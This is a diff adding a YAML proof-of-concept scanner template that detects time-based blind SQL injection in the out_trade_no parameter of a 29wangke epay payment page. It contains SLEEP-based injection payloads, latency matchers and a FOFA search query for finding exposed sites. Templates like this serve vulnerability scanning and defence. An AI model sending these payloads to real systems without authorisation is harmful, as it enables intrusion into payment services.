@@ -1,0 +1,33 @@
+name: poc-yaml-29wangke-epay-sql-injection
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /epay/epay.php
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/x-www-form-urlencoded
+      body: out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(3)))eEcA) AND 'aEmC'='aEmC
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: POST
+      path: /epay/epay.php
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/x-www-form-urlencoded
+      body: out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(6)))eEcA) AND 'aEmC'='aEmC
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139576403
+
+# fofa: body="你在看什么呢?我写的代码好看吗"
